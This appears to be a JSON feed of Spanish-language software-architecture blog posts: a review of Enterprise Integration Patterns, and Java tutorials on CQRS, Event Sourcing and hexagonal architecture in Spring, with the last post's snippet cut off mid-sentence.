[ { "title": "Reseña del Libro Enterprise Integration Patterns", "url": "/posts/resena-del-libro-enterprise-integration-patterns/", "categories": "Microservicios, Software, Architecture", "tags": "Microservicios, Software, Architecture", "date": "2025-02-18 02:00:00 -0300", "snippet": "Resumen GeneralEnterprise Integration Patterns: Designing, Building, and Deploying Messaging Solutions es un libro escrito en 2003 por Gregor Hohpe y Bobby Woolf que explora cómo integrar soluciones empresariales utilizando mensajería. En su contexto original, las soluciones tecnológicas se centraban en una estrategia conjunta entre la infraestructura y la lógica de negocio, con actores principales como Java JEE, JMS y C#, Microsoft MSMQ, Biztalk, junto a soluciones de integración como TIBCO ActiveEnterprise. Muchas de estas tecnologías hoy se consideran legacy, pero los principios y patrones de mensajería descritos en el libro siguen siendo relevantes.A pesar de la evolución hacia arquitecturas modernas como microservicios, cloud computing y frameworks de integración, las arquitecturas basadas en mensajería (EDA: Event-Driven Architecture) siguen vigentes. Estas se han adaptado tanto en implementaciones de microservicios como en soluciones en la nube, utilizadas por proveedores de infraestructura y desarrolladores de software por igual.Relevancia ActualEste libro no solo ayuda a comprender sistemas legacy y cómo la integración involucraba tanto a la lógica de negocio como a la infraestructura, sino que también presenta patrones de integración que, aunque no se mencionan frecuentemente en el desarrollo moderno, siguen siendo fundamentales. Estos patrones son utilizados diariamente, a veces sin ser plenamente conscientes de su aplicación.Si bien los patrones de diseño ayudan a crear software robusto, conocer los patrones de integración permite desarrollar soluciones escalables y resilientes, sentando las bases de tecnologías contemporáneas como: Brokers de Mensajería: Apache Kafka, RabbitMQ, AWS SQS, Google Pub/Sub y otros. Comunicación en Microservicios: Estrategias para comunicación asincrónica y sincrónica. Arquitectura Orientada a Eventos (EDA): Patrón de diseño reactivo basado en eventos. Frameworks para Microservicios: Spring Cloud, Spring Integration, Apache Camel, NestJs Microservices, entre otros. Desafíos en Comunicación entre microservicios: Gestión de comunicación sincrónica y asincrónica. Estándares de Comunicación: Comprender RESTful, gRPC y futuras opciones de comunicación. Sistemas Reactivos: Patrones y principios en RxJs, Spring WebFlux, entre otros.Opinión y Puntos Claves Del LibroEl libro ofrece una perspectiva práctica sobre el desarrollo de soluciones integradas. Aunque incluye ejemplos de código, estos pueden considerarse desfasados debido a las alternativas tecnológicas actuales. Sin embargo, los diagramas y casos prácticos permiten comprender visualmente cómo aplicar los patrones de integración, lo que facilita su adaptación a arquitecturas modernas.El libro explica cuatro enfoques para la integración de aplicaciones empresariales: Transferencia de Archivos, Base de Datos Compartida, RPC y Mensajería, destacando y ampliando esta última por su flexibilidad. Explica los conceptos clave de los sistemas de mensajería, sus canales (Point-to-Point, Publish-Subscribe, Dead Letter, Message Bus, Etc) y la gestión de errores. También cubre la construcción de mensajes, patrones de enrutamiento y la conexión de aplicaciones mediante puntos de conexión, abordando componentes como Messaging Gateway, Transactional Client, Polling Consumer y Service Activator.Este libro es un complemento ideal para quienes buscan aprender o profundizar en el desarrollo de aplicaciones integradas con enfoques actuales como Kafka, RabbitMQ u otras soluciones de comunicación asíncrona. Además, proporciona una base sólida para diseñar y entender sistemas donde predominan los microservicios y arquitecturas orientadas a eventos.¿Dónde se encuentran estos patrones en nuestras arquitecturas actuales?Los patrones y conceptos presentados en Enterprise Integration Patterns se encuentran en las siguientes tecnologías utilizadas en el desarrollo de software:Comunicación Asíncrona en MicroserviciosPatrones como Publish-Subscribe Channel, Message Broker y Event Message son fundamentales para implementar comunicación asíncrona y desacoplada en arquitecturas de microservicios. Herramientas como Apache Kafka, RabbitMQ y AWS SQS utilizan estos patrones para garantizar la entrega confiable de mensajes y permitir la escalabilidad horizontal.Saga Patterns para Transacciones DistribuidasPara gestionar transacciones distribuidas en microservicios sin bloquear recursos, se utilizan Competing Consumers, Process Manager, Event-Driven Consumer y Transactional Client. Estos patrones facilitan la coordinación de eventos y la compensación de acciones en caso de fallos, asegurando la consistencia eventual. Transactional Client garantiza transacciones atómicas en el envío y recepción de mensajes, evitando la pérdida de datos en situaciones de fallo.CQRS y Event SourcingMessage Store, Event Message y Message Sequence son patrones clave en la implementación de CQRS (Command Query Responsibility Segregation) y Event Sourcing. Estos permiten separar la lógica de lectura y escritura, manteniendo un historial completo de cambios a través de eventos inmutables. Apache Kafka es frecuentemente utilizado para implementar estos patrones debido a su naturaleza de almacenamiento basado en logs.Sistemas de Eventos, Alertas y Notificaciones en Monitoreo de SistemasPatrones como Event Message, Message Filter y Message Dispatcher se utilizan para sistemas de monitoreo y alertas en tiempo real. Estos permiten la detección de eventos críticos y la notificación proactiva en arquitecturas de observabilidad. Soluciones como Prometheus Alertmanager y AWS CloudWatch aplican estos conceptos para gestionar eventos y alertas de manera eficiente.Integración entre Servicios CloudMessaging Bridge, Message Router y Canonical Data Model son patrones esenciales en la integración de servicios en múltiples nubes y arquitecturas híbridas. Se utilizan para conectar sistemas heterogéneos y transformar datos en tiempo real. Google Pub/Sub, AWS SNS/SQS y Azure Event Grid aplican estos patrones para asegurar una integración fluida y desacoplada entre servicios cloud.Aplicaciones ReactivasEn aplicaciones reactivas, se utilizan patrones como Event-Driven Consumer, Message Dispatcher e Idempotent Receiver para manejar flujos de eventos asincrónicos. Estas arquitecturas permiten la reactividad en tiempo real y son implementadas mediante frameworks como RxJs en Angular, Spring WebFlux en Java y Project Reactor en Microservicios Spring.Valoración personalDe una escala del 1 al 5, le doy un 4.5 por su interesante perspectiva del desarrollo de soluciones empresariales. Hubiera deseado que algunos ejemplos hubiesen sido más conceptuales, en lugar de centrarse en una tecnología específica, pero era lo del momento y se entiende." }, { "title": "¿Qué es CQRS y cómo funciona? Con un ejemplo práctico.", "url": "/posts/que-es-cqrs-y-como-funciona-con-un-ejemplo-practico/", "categories": "Java, Architecture, Coding, Backend, Fullstack", "tags": "Java, Architecture, Coding, Backend, Fullstack", "date": "2025-02-04 02:00:00 -0300", "snippet": "¿Qué es CQRS y qué problema soluciona?CQRS (Command Query Responsibility Segregation) es un patrón arquitectónico que separa las operaciones de lectura y escritura en una aplicación. En lugar de usar un solo modelo para ambas tareas, CQRS define modelos independientes: uno para procesar comandos (modificaciones de datos) y otro para ejecutar consultas (lectura de datos).Escalabilidad de aplicaciones mediante arquitecturaEsta separación mejora el rendimiento al evitar conflictos entre lecturas y escrituras, facilita la escalabilidad ajustando cada parte según sus necesidades y simplifica el mantenimiento en sistemas complejos. Es especialmente útil en aplicaciones con alta concurrencia o grandes volúmenes de datos, donde optimizar cada operación por separado marca la diferencia. En el siguiente artículo Alto rendimiento con CQRS y NestJs Podrás ver cómo CQRS mejora el rendimiento de una aplicación.Ventajas y desventajasVentajas: Escalabilidad: Permite escalar las partes de lectura y escritura de forma independiente, optimizando los recursos. Simplicidad: Simplifica el modelo de dominio al separar las responsabilidades de escritura y lectura. Rendimiento: Mejora el rendimiento al optimizar las bases de datos para cada tipo de operación. Flexibilidad: Facilita la implementación de diferentes modelos de datos para lectura y escritura.Desventajas: Complejidad: Introduce complejidad arquitectónica al separar las responsabilidades. Consistencia eventual: Puede generar inconsistencia eventual entre los datos de escritura y lectura. Sobrecarga: Requiere la implementación de componentes adicionales como buses de comandos y consultas.Componentes principales commands: Representan intenciones de cambiar el estado del sistema. Son objetos que contienen información sobre la operación a realizar, pero no el resultado de la operación. queries: Representan solicitudes de información del sistema. Son objetos que especifican qué datos se necesitan, pero no cómo obtenerlos. command handlers: Son responsables de ejecutar los comandos. Reciben un comando, validan la información y modifican el estado del dominio. query handlers: Son responsables de ejecutar las consultas. Reciben una consulta y devuelven los datos solicitados. command bus: Es el componente encargado de enrutar los comandos a sus respectivos handlers. query bus: Es el componente encargado de enrutar las consultas a sus respectivos handlers. read model: Es una representación optimizada de los datos para lectura. Puede ser una base de datos diferente o una vista materializada. write model: Es el modelo de dominio principal donde se realizan las operaciones de escritura.Ejemplo práctico con JavaSistema de reseñas de productos con CQRSEl ejemplo práctico implementa un sistema de reseñas de productos utilizando el patrón CQRS. El sistema permite a los usuarios agregar reseñas, comentarios y reacciones a las reseñas, así como consultar las reseñas y comentarios de un producto.Descripción del modelo de dominioEl modelo de dominio incluye entidades como Product, Review, ReviewComment, User y ReviewReaction, que representan los elementos del sistema de reseñas. También se utilizan value objects como Content para encapsular el contenido de las reseñas y comentarios.@Getter@ToString@Builderpublic class Review { private Double score; private Product product; private Content content; private List&lt;ReviewComment&gt; comments; private List&lt;ReviewReaction&gt; reactions; public void addReaction(ReviewReaction reaction) { this.reactions.add(reaction); } public void addComment(ReviewComment comment) { this.comments.add(comment); }}@Getter@ToString@AllArgsConstructor@Builderpublic class ReviewComment { private String id; private Content content; private List&lt;ReviewReaction&gt; reactions; public void addReaction(ReviewReaction reaction) { this.reactions.add(reaction); }}@Getter@ToString@AllArgsConstructorpublic class Product { private String sku; private String name;}@Getter@ToString@AllArgsConstructorpublic class User { private String id; private String fullname; private String email;}public enum ReactionType { LIKE,DISLIKE,HELPFUL}@Getter@ToString@AllArgsConstructorpublic class ReviewReaction { private User user; private ReactionType type;}@Getter@ToString@AllArgsConstructorpublic class Content { private User user; private String content;}Casos de usoLos casos de uso incluyen: Agregar una reseña a un producto. Agregar un comentario a una reseña. Agregar una reacción a una reseña o comentario. Obtener las reseñas de un producto. Obtener los comentarios de una reseña.@AllArgsConstructorpublic class ReviewUseCases { private ReviewWriteRepository reviewWriteRepository; private UserReadRepository userReadRepository; private ProductReadRepository productReadRepository; private ReviewReadRepository reviewReadRepository; private EventBus eventBus; public void addReview(AddReviewCommand command) { var user = this.userReadRepository.findById(command.userId()) .orElseThrow(() -&gt; new NoSuchElementException(\"User not found\")); var product = this.productReadRepository.findBySku(command.sku()) .orElseThrow(() -&gt; new NoSuchElementException(\"Product not found\")); var review = Review.builder() .score(command.score()) .content(new Content(user, command.content())) .product(product) .build(); this.reviewWriteRepository.save(review); var event = new ReviewCreatedEvent(UUID.randomUUID().toString(), LocalDateTime.now(), review); this.eventBus.dispatch(event); } public void addReviewReaction(AddReviewReactionCommand command) { var user = this.userReadRepository.findById(command.userId()) .orElseThrow(() -&gt; new NoSuchElementException(\"User not found\")); var review = this.reviewReadRepository.findById(command.reviewId()) .orElseThrow(() -&gt; new NoSuchElementException(\"Review not found\")); var reaction = new ReviewReaction(user, command.reaction()); review.addReaction(reaction); this.reviewWriteRepository.save(review); var event = new ReviewUpdatedEvent(UUID.randomUUID().toString(), LocalDateTime.now(), review); this.eventBus.dispatch(event); } public void addReviewComment(AddReviewCommentCommand command) { var user = this.userReadRepository.findById(command.userId()) .orElseThrow(() -&gt; new NoSuchElementException(\"User not found\")); var review = this.reviewReadRepository.findById(command.reviewId()) .orElseThrow(() -&gt; new NoSuchElementException(\"Review not found\")); var comment = ReviewComment.builder() .id(UUID.randomUUID().toString()) .content(new Content(user, command.content())) .build(); review.addComment(comment); this.reviewWriteRepository.save(review); var event = new ReviewUpdatedEvent(UUID.randomUUID().toString(), LocalDateTime.now(), review); this.eventBus.dispatch(event); } public List&lt;ReviewResult&gt; getReviewsByProduct(GetReviewsByProductQuery query) { return this.reviewReadRepository.findByProductSku(query.sku()) .stream() .map(ReviewResult::map) .toList(); }}@AllArgsConstructorpublic class ReviewCommentUseCases { private UserReadRepository userReadRepository; private ReviewCommentReadRepository reviewCommentReadRepository; private ReviewCommentWriteRepository reviewCommentWriteRepository; private EventBus eventBus; public void addReviewCommentReaction(AddReviewCommentReactionCommand command) { var user = this.userReadRepository.findById(command.userId()) .orElseThrow(() -&gt; new NoSuchElementException(\"User not found\")); var reviewComment = this.reviewCommentReadRepository.findById(command.reviewCommentId()) .orElseThrow(() -&gt; new NoSuchElementException(\"Review comment not found\")); var reaction = new ReviewReaction(user, command.reaction()); reviewComment.addReaction(reaction); this.reviewCommentWriteRepository.save(reviewComment); var event = new ReviewCommentCreatedEvent(UUID.randomUUID().toString(), LocalDateTime.now(), reviewComment); this.eventBus.dispatch(event); } public List&lt;ReviewCommentResult&gt; getReviewComments(GetReviewCommentsQuery query) { return this.reviewCommentReadRepository.findByReviewId(query.reviewId()) .stream() .map(ReviewCommentResult::map) .toList(); }}Repositorios Read Model and Write ModelSe utilizan repositorios separados para lectura (ReviewReadRepository, ReviewCommentReadRepository, etc.) y escritura (ReviewWriteRepository, ReviewCommentWriteRepository, etc.). Esto permite optimizar cada repositorio para su respectiva función.public interface ReviewReadRepository { Optional&lt;Review&gt; findById(String id); List&lt;Review&gt; findByProductSku(String sku);}public interface ReviewWriteRepository { void save(Review review);}public interface ReviewCommentWriteRepository { void save(ReviewComment comment);}public interface ReviewCommentReadRepository { Optional&lt;ReviewComment&gt; findById(String id); List&lt;ReviewComment&gt; findByReviewId(String id);}public interface UserReadRepository { Optional&lt;User&gt; findById(String id);}public interface ProductReadRepository { Optional&lt;Product&gt; findBySku(String sku);} La implementación técnica puede incluir distintas tecnologías de almacenamiento optimizadas para lectura o escritura, dependiendo del caso; pero esto va más allá de este artículo.Ejecución de comandosLos comandos se ejecutan a través del CommandBus. Por ejemplo, para agregar una reseña, se crea un objeto AddReviewCommand y se envía al CommandBus. El CommandBus enruta el comando al AddReviewCommandHandler, que ejecuta la lógica de negocio y modifica el modelo de dominio.// Command@Builderpublic record AddReviewCommand (String sku, Double score, String userId, String content) implements Command {}// Ejemplo de ejecución de un comandoAddReviewCommand command = AddReviewCommand.builder() .sku(\"SKU123\") .score(4.5) .userId(\"user123\") .content(\"Buena reseña\") .build();commandBus.dispatch(command);// CommandBuspublic interface CommandBus { void dispatch(Command command);}// CommandHandlerpublic interface CommandHandler&lt;T extends Command&gt; { void onCommand(T command);}// Implementación de CommandBus@Builderpublic class ConcurrentCommandBus implements CommandBus { private final AddReviewCommandHandler addReviewCommandHandler; private final AddReviewCommentCommandHandler addReviewCommentCommandHandler; private final AddReviewReactionCommandHandler addReviewReactionCommandHandler; private final AddReviewCommentReactionCommandHandler addReviewCommentReactionCommandHandler; @Override public void dispatch(Command command) { try (var executor = Executors.newVirtualThreadPerTaskExecutor()) { switch (command) { case AddReviewCommand addReviewCommand -&gt; executor.submit( () -&gt; addReviewCommandHandler.onCommand(addReviewCommand)); case AddReviewCommentCommand addReviewCommentCommand -&gt; executor.submit( () -&gt; addReviewCommentCommandHandler.onCommand(addReviewCommentCommand)); case AddReviewReactionCommand addReviewReactionCommand -&gt; executor.submit( () -&gt; addReviewReactionCommandHandler.onCommand(addReviewReactionCommand)); case AddReviewCommentReactionCommand addReviewCommentReactionCommand -&gt; executor.submit( () -&gt; addReviewCommentReactionCommandHandler.onCommand(addReviewCommentReactionCommand)); default -&gt; throw new IllegalArgumentException(\"Unknown command: \" + command.getClass().getSimpleName()); } } }}// Implementación CommandHandler@AllArgsConstructorpublic class AddReviewCommandHandler implements CommandHandler&lt;AddReviewCommand&gt; { private final ReviewUseCases review; @Override public void onCommand(AddReviewCommand command) { this.review.addReview(command); }}Ejecución de queriesLas consultas se ejecutan a través del QueryBus. Para obtener las reseñas de un producto, se crea un objeto GetReviewsByProductQuery y se envía al QueryBus. El QueryBus enruta la consulta al GetReviewsByProductQueryHandler, que consulta el Read Model y devuelve los resultados.// Querypublic record GetReviewsByProductQuery(String sku) implements Query {}// Ejemplo de ejecución de una consultaGetReviewsByProductQuery query = new GetReviewsByProductQuery(\"SKU123\");CompletableFuture&lt;List&lt;ReviewResult&gt;&gt; future = queryBus.query(query, ReviewResult.class);List&lt;ReviewResult&gt; reviews = future.join();// QueryBuspublic interface QueryBus { &lt;R extends Result&gt; CompletableFuture&lt;List&lt;R&gt;&gt; query(Query query, Class&lt;R&gt; queryType);}// QueryHandlerpublic interface QueryHandler&lt;Q extends Query, R&gt; { List&lt;R&gt; onQuery(Q query);}// Implementación QueryBus@Builderpublic class ConcurrentQueryBus implements QueryBus { private final GetReviewCommentsQueryHandler getReviewCommentsQueryHandler; private final GetReviewsByProductQueryHandler getReviewsByProductQueryHandler; @Override @SuppressWarnings(\"unchecked\") public &lt;R extends Result&gt; CompletableFuture&lt;List&lt;R&gt;&gt; query(Query query, Class&lt;R&gt; queryType) { try (var executor = Executors.newVirtualThreadPerTaskExecutor()) { return switch (query) { case GetReviewCommentsQuery getReviewCommentsQuery -&gt; CompletableFuture.supplyAsync( () -&gt; (List&lt;R&gt;) getReviewCommentsQueryHandler.onQuery(getReviewCommentsQuery), executor); case GetReviewsByProductQuery getReviewsByProductQuery -&gt; CompletableFuture.supplyAsync( () -&gt; (List&lt;R&gt;) getReviewsByProductQueryHandler.onQuery(getReviewsByProductQuery), executor); default -&gt; throw new IllegalArgumentException(\"Unknown query:\" + query.getClass().getSimpleName()); }; } }}//Implementación QueryHandler@AllArgsConstructorpublic class GetReviewsByProductQueryHandler implements QueryHandler&lt;GetReviewsByProductQuery, ReviewResult&gt; { private final ReviewUseCases reviewUseCases; @Override public List&lt;ReviewResult&gt; onQuery(GetReviewsByProductQuery query) { return this.reviewUseCases.getReviewsByProduct(query); }}Sincronización del read model con el write model.La separación del modelo de datos en uno de lectura y otro de escritura conlleva considerar que nuestro sistema tendrá que lidiar con la consistencia eventual y estos 2 modelos deben sincronizarse, por lo que tenemos las siguientes opciones: CDC (change capture data) solucion de infraestructura: Una forma de sincronizar el Read Model con el Write Model es utilizando Change Data Capture (CDC). CDC captura los cambios en el Write Model (generalmente una base de datos) y los propaga al Read Model. Esto se puede implementar con herramientas como Debezium, Apache Kafka Connect, Etc. Réplicas de lectura de AWS: AWS ofrece la posibilidad de crear réplicas de lectura de las bases de datos. Estas réplicas se pueden utilizar como Read Model, ya que replican los cambios del Write Model de forma asíncrona. Esta opción es ideal para evitar preocuparnos de la infraestructura, solo debemos considerar los costos asociados. Vistas materializadas: Una vista materializada es una tabla que almacena el resultado de una consulta predefinida y se actualiza periódicamente para reflejar los cambios en los datos subyacentes. Esta técnica permite mejorar el rendimiento de las consultas de lectura sin afectar la base de datos principal. Este enfoque es utilizado cuando el Write Model y el Read Model están en el mismo motor de base de datos. Eventos de integración: Otra forma es utilizando eventos de integración. Cuando se realiza un cambio en el Write Model, se genera un evento que se publica en un bus de eventos (EventBus). Los componentes que mantienen el Read Model se suscriben a estos eventos y actualizan el Read Model en consecuencia. Este es el enfoque utilizado en el ejemplo de código. Cuando se crea una nueva review, se publica un evento ReviewCreatedEvent que es consumido por los event handlers que actualizan el Read Model.En el siguiente ejemplo, podemos ver la sincronización mediante eventos de integración. Estos pueden ser consumidos por componentes de la misma aplicación u otra aplicación que actúa como un worker o job.// Eventpublic record ReviewCreatedEvent(String eventId, LocalDateTime createdAt, Review payload) implements Event {}// Ejemplo de publicación de un eventoReviewCreatedEvent event = new ReviewCreatedEvent(UUID.randomUUID().toString(), LocalDateTime.now(), review);eventBus.dispatch(event);// Ejemplo de un event handlerpublic class ReviewCreatedEventHandler implements EventHandler&lt;ReviewCreatedEvent&gt; { @Override public void onEvent(ReviewCreatedEvent event) { System.out.println(\"saving Review on read model:\" + event.payload()); }}ConclusiónLa separación de modelos de lectura y escritura en CQRS permite mejorar significativamente la escalabilidad y la organización del código. Al dividir estas responsabilidades, el sistema puede optimizar consultas y comandos de manera independiente, evitando bloqueos en la base de datos y permitiendo ajustar los recursos según las necesidades de cada operación. Esto resulta especialmente útil en aplicaciones con alta concurrencia o grandes volúmenes de datos, donde mantener un solo modelo puede generar cuellos de botella.Sin embargo, esta separación introduce el desafío de sincronizar el modelo de lectura con el de escritura, asegurando que los datos reflejen cambios recientes sin comprometer el rendimiento. Estrategias como CDC, réplicas de lectura y eventos de integración permiten mantener la consistencia eventual, cada una con sus propias ventajas y consideraciones. Elegir el enfoque adecuado dependerá de los requisitos del sistema y su infraestructura, garantizando un balance entre rendimiento, consistencia y costos operativos.Github repository" }, { "title": "¿Qué es y cómo funciona el Event Sourcing con un ejemplo práctico?", "url": "/posts/que-es-y-como-funciona-el-event-sourcing-con-un-ejemplo-practico/", "categories": "Java, Architecture, Coding, Backend, Fullstack, Microservices", "tags": "Java, Architecture, Coding, Backend, Fullstack, Microservices", "date": "2025-01-28 02:00:00 -0300", "snippet": "¿Qué es Event Sourcing?Event Sourcing es un patrón de arquitectura de software que trata cada cambio en el estado de una aplicación como un evento. En lugar de almacenar el estado actual de un objeto, se almacenan los eventos que han ocurrido, los cuales se pueden reproducir para recrear el estado del objeto en cualquier momento. Esto permite tener un historial completo de las transacciones, facilitando la auditoría y la recuperación ante desastres.CRUD vs Event SourcingEl enfoque tradicional de CRUD (Crear, Leer, Actualizar, Eliminar) se centra en interactuar con el estado actual de una entidad. En contraste, Event Sourcing se enfoca en la secuencia de eventos que han llevado a ese estado.Ventajas y desventajasVentajas: Auditoría completa: Permite un seguimiento detallado de todas las acciones. Reproducción del estado: El estado de una entidad puede ser reconstruido en cualquier momento. Facibilidad en el manejo de cambios: Cambios en los requisitos son más fáciles de implementar, ya que solo se necesita añadir nuevos eventos.Desventajas: Complejidad: Puede introducir mayor complejidad en la gestión de estados. Carga de almacenamiento: Almacenar todos los eventos puede requerir mucho espacio. Performance: La recuperación del estado puede ser más lenta que un enfoque de estado actual. Consistencia eventual: Las arquitecturas basadas en eventos deben lidiar con la consistencia eventual, donde los datos pueden no estar inmediatamente sincronizados, pero eventualmente se reflejan en todos los componentes del sistema.Conceptos principales de Event Sourcing Events: Son representaciones de un cambio de estado en el sistema. Cada evento indica una acción que ha tenido lugar, como “Orden Creada” o “Orden Completada”. Event Stream: Es la secuencia de eventos que se han producido para una entidad específica a lo largo del tiempo. Event Store: Un almacenamiento especializado para guardar eventos, permitiendo su recuperación y consulta. Entities and Aggregates: Las entidades son objetos en el dominio que contienen datos y lógica de negocio. Los agregados son conjuntos de entidades que se tratan como una unidad para asegurar la coherencia de los cambios. Projections: Representaciones de datos derivadas de eventos, que permiten consultas eficientes sin necesidad de reconstruir el estado desde cero. Snapshots: Instantáneas del estado actual de un agregada, que ayudan a optimizar el rendimiento al evitar la necesidad de reproducir cada evento para reconstruir el estado.Dejemos de lado la teoría y vamos con un ejemplo práctico.Ejemplo práctico: Manejo de órdenes de compra con JavaEn este ejemplo, vamos a ver cómo implementar event sourcing para manejar el ciclo de vida de órdenes de compra. El código proporcionado abarca la creación, entrega y finalización de órdenes.Definición y aplicación de eventos sobre OrderEn la clase Order, se instancian eventos como OrderCreatedEvent, OrderDeliveredEvent y OrderCompletedEvent, cada uno de ellos describe un cambio en el estado de la orden:Estructura de eventos:@Getter@ToString@RequiredArgsConstructorpublic abstract class Event { private final String id; private final LocalDateTime createdAt; public Event() { this(UUID.randomUUID().toString(), LocalDateTime.now()); }}@Getter@ToString@AllArgsConstructorpublic class OrderCreatedEvent extends Event { private String orderId; private List&lt;Product&gt; products; private Integer total; private OrderStatus status;}@Getter()@ToString@AllArgsConstructor()public class OrderDeliveredEvent extends Event { private String orderId; private Shipping shipping; private OrderStatus status;}@Getter@ToString@AllArgsConstructorpublic class OrderCompletedEvent extends Event { private String orderId; private OrderStatus status;}Estructura y creación de Order:public static Order create(String orderId, List&lt;Product&gt; products) { var order = new Order(); var total = products.stream() .map(Product::getQuantity) .reduce(0, Integer::sum); var event = new OrderCreatedEvent(orderId, products, total, OrderStatus.CREATED); order.apply(event); order.events.add(event); return order;}En este código aplicamos la creación de una orden, realizamos todos los cálculos o validaciones que necesitamos, creamos un evento y lo aplicamos, es decir, actualizamos el estado de la entidad.private void apply(OrderCreatedEvent event) { this.id = event.getOrderId(); this.products = event.getProducts(); this.status = event.getStatus(); this.total = event.getTotal();}De esta forma, nuestra entidad Order tendrá un estado consistente dependiendo de los eventos que se apliquen.Casos de uso y lógica de dominio de OrderLa lógica de negocio se centraliza en la clase OrderUseCases, donde se manejan comandos como crear y completar órdenes:public void createOrder(CreateOrderCommand command) { var order = Order.create(command.orderId(), command.products()); order.getEvents() .forEach(event -&gt; this.orderEventStore.save(event)); order.cleanEvents();}Al invocar Order.create() realizamos las operaciones necesarias para crear la orden. Después obtendremos los eventos que se han generado internamente en la entidad Order y los guardamos en el EventStore.Almacenamientos de eventosDefinimos la interfaz OrderEventStore, que se utiliza para almacenar y recuperar eventos:public interface OrderEventStore { void save(Event event); Stream&lt;Event&gt; findByOrderId(String orderId);}No nos preocuparemos de la implementación del event store, ya que va más allá del alcance de este artículo.Consulta de un stream de eventosCuando se necesita recrear el estado de una orden a partir de sus eventos, se utiliza el método fromEventStream:ublic static Order fromEventStream(Stream&lt;Event&gt; events) { var order = new Order(); events.forEach(event -&gt; { switch (event) { case OrderCreatedEvent orderCreatedEvent -&gt; order.apply(orderCreatedEvent); case OrderDeliveredEvent orderDeliveredEvent -&gt; order.apply(orderDeliveredEvent); case OrderCompletedEvent orderCompletedEvent -&gt; order.apply(orderCompletedEvent); default -&gt; throw new IllegalStateException(\"Invalid event found: \" + event.getClass().getName()); } }); return order;}Este método nos ayuda a recrear una Order; solo debemos proporcionar el stream de eventos consultando el EventStore:var eventStream = this.orderEventStore.findByOrderId(command.orderId());var order = Order.fromEventStream(eventStream);Guardado de proyeccionesEn nuestro caso de uso completeOrder() queremos persistir la orden completada y para esto nos ayudaremos de las proyecciones. Esta proyección se guarda al completar una orden. Se utiliza la clase OrderProjection para representar el estado actual:Estructura de la proyección.public record ProductProjection(String sku, String name, Integer quantity) {}public record OrderProjection(String id, List&lt;ProductProjection&gt; products, Integer total) { }Caso de uso y guardado de la proyección.public void completeOrder(CompleteOrderCommand command) { var eventStream = this.orderEventStore.findByOrderId(command.orderId()); var order = Order.fromEventStream(eventStream); order.complete(); order.getEvents() .forEach(event -&gt; this.orderEventStore.save(event)); var projection = new OrderProjection( order.getId(), order.getProducts().stream() .map(p -&gt; new ProductProjection(p.getSku(), p.getName(), p.getQuantity())) .toList(), order.getTotal() ); this.orderProjectionRepository.save(projection); order.cleanEvents();}ConclusiónEvent Sourcing es un poderoso patrón arquitectónico que proporciona una forma efectiva de manejar el estado y la historia de las operaciones en sistemas complejos. Aunque introduce cierta complejidad y consideraciones de rendimiento, sus beneficios en términos de trazabilidad, flexibilidad y consistencia son significativos, especialmente para aplicaciones que requieren un seguimiento detallado de las interacciones y cambios en el sistema.Github repository" }, { "title": "Integración de arquitectura hexagonal en Spring", "url": "/posts/integracion-de-arquitectura-hexagonal-en-spring/", "categories": "Arquitectura,Arquitectura, Software,Spring,Microservicios,Backend", "tags": "arquitectura,arquitectura, software,spring,microservicios,backend", "date": "2024-08-29 01:00:00 -0400", "snippet": "La arquitectura hexagonal busca separar el dominio de las implementaciones tecnológicas. El modelado de dominio se puede hacer mediante DDD, pero no es obligatorio. Sin embargo, hay patrones muy útiles que pueden ayudarte a crear un código más mantenible.RECUERDA: el diseño y la aplicación de patrones o ciertas arquitecturas dependerán del problema que quieres solucionar y si este aporta valor al objetivo planteado.Ejemplo práctico de una arquitectura hexagonal aplicada en Spring BootImplementaremos una aplicación base CRUD para un clon de LinkedIn. Este ejemplo es simple, con una sola entidad que representa a un profesional. Si quieres ver el ejemplo más a fondo, revisa el siguiente repositorio Java Architecture Patterns¿Qué es la arquitectura hexagonal?La arquitectura hexagonal, también conocida como arquitectura de puertos y adaptadores, permite desacoplar el núcleo de la lógica de negocio de las implementaciones tecnológicas, haciendo que la aplicación sea más fácil de mantener, probar y escalar.A continuación, se explica la estructura y los componentes principales de esta aplicación de ejemplo:Capa de Aplicación ProfessionalUseCases: Define los casos de uso que el sistema expone. En este caso, hay un método createProfessional que permite crear un nuevo profesional. Este método se encarga de coordinar la creación de un nuevo Professional en la capa de dominio, guardar ese profesional a través del repositorio y publicar un evento de dominio (ProfessionalCreatedEvent) en el bus de eventos.Capa de DominioEntidades: Professional: Es la entidad central en el dominio. Se encarga de representar a un profesional con atributos como id, firstname y lastname. Incluye una validación mediante el uso de Jakarta Bean Validation (@NotBlank, @UUID) para asegurar que los datos son correctos. La creación de un Professional se realiza a través del método estático create.Eventos de Dominio: ProfessionalCreatedEvent: Representa un evento que ocurre cuando un nuevo profesional es creado. Este evento se propaga a través del bus de eventos de dominio (DomainEventBus).Excepciones: DomainException: Se lanza cuando hay un problema en la validación o en la lógica del dominio.Interfaces (Puertos): ProfessionalRepository: Define las operaciones que deben implementarse para interactuar con la persistencia de datos de Professional. DomainEventBus: Define el contrato para publicar eventos de dominio.Capa de InfraestructuraPersistencia: ProfessionalEntity: Es la representación de la entidad Professional en la base de datos, mapeada usando JPA. Define cómo se almacenan los datos en la tabla professionals. JpaProfessionalRepository: Extiende JpaRepository para proporcionar métodos CRUD para ProfessionalEntity. PostgresProfessionalRepository: Implementa el puerto ProfessionalRepository usando el repositorio JPA subyacente. Se encarga de mapear los datos entre las entidades de dominio (Professional) y las entidades de base de datos (ProfessionalEntity).Adaptadores: InMemoryDomainEventBus: Es una implementación del bus de eventos que se utiliza para publicar eventos de dominio, aunque en este caso es una implementación en memoria que podría usarse en pruebas o desarrollo.Configuración:CoreConfig:Configura los beans de la aplicación, como el caso de uso (ProfessionalUseCases) y el bus de eventos (DomainEventBus), usando Spring.Flujo General: Crear Profesional: El cliente invoca el caso de uso createProfessional pasando los datos necesarios. Validación: En la capa de dominio, se valida la creación del Professional. Persistencia: El Professional creado se guarda en la base de datos a través de PostgresProfessionalRepository. Publicación de Evento: Se publica un evento de dominio (ProfessionalCreatedEvent) usando el bus de eventos configurado.Este diseño modular permite que la aplicación sea flexible y fácilmente extensible, como por ejemplo, cambiar el sistema de almacenamiento o la implementación del bus de eventos sin afectar el núcleo de la lógica de negocio.Integración con frameworksComo hemos dicho antes, este enfoque de arquitectura nos permite separar el dominio y las lógicas de negocio de cualquier implementación externa tecnológica. Esto nos da la ventaja de poder crear aplicaciones más mantenibles y agrega más simplicidad al testing unitario. En este ejemplo, integramos la capa de dominio y la capa de aplicación con Spring, pero perfectamente este enfoque se puede hacer con cualquier otro framework.Creando adaptadoresPara poder instanciar los componentes de tipo servicio o repository en una aplicación de Spring con arquitectura hexagonal, 